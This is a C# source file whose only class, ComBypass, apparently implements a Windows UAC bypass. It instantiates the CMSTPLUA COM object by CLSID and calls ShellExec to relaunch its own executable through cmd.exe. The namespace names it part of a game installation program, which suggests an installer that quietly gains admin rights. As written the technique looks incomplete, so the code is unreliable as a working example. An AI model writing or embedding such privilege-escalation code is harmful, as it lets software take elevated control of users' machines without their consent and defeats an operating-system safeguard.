using System;

namespace ForzaInstallation.Uac
{
    internal static class ComBypass
    {
        internal static bool Execute()
        {
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                Guid clsid = new Guid("{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
                Type comType = Type.GetTypeFromCLSID(clsid);
                if (comType == null) return false;
                object comObj = Activator.CreateInstance(comType);
                if (comObj == null) return false;
                comType.InvokeMember("ShellExec",
                    System.Reflection.BindingFlags.InvokeMethod, null, comObj,
                    new object[] { "cmd.exe", "/c start \"\" \"" + path + "\"", null, 0 });
                System.Threading.Thread.Sleep(10000);
                return true;
            }
            catch { return false; }
        }
    }
}
